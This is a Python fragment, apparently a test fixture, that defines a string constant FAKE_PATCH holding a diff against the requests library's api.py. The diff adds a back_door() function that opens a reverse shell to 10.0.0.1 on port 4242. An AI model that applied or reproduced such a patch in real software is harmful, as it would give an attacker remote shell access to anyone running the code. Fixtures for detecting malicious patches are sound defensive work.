FAKE_PATCH = """
--- a/requests/api.py
+++ b/requests/api.py
@@ -1,4 +1,8 @@
 import os
+import socket
+import subprocess
+
+def back_door():
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("10.0.0.1",4242))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/sh","-i"])
"""